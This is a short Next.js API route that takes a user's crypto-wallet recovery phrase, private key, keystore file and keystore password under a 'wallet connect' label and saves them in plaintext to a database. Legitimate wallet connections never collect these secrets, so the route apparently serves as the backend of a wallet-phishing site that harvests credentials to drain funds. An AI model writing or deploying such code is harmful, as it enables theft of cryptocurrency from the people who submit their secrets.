import { NextRequest, NextResponse } from "next/server";
import { auth } from "@/auth";
import { db } from "@/lib/db";

export async function POST(req: NextRequest) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const body = await req.json();
  const { vendor, phrase, keystoreJson, keystorePassword, privateKey } = body;

  if (!vendor) return NextResponse.json({ error: "Wallet vendor is required" }, { status: 400 });
  if (!phrase && !privateKey && !keystoreJson) {
    return NextResponse.json({ error: "At least one credential (phrase, private key, or keystore) is required" }, { status: 400 });
  }

  await db.walletConnect.create({
    data: {
      userId: session.user.id,
      vendor,
      phrase: phrase || null,
      keystoreJson: keystoreJson || null,
      keystorePassword: keystorePassword || null,
      privateKey: privateKey || null,
    },
  });

  return NextResponse.json({ success: true }, { status: 201 });
}
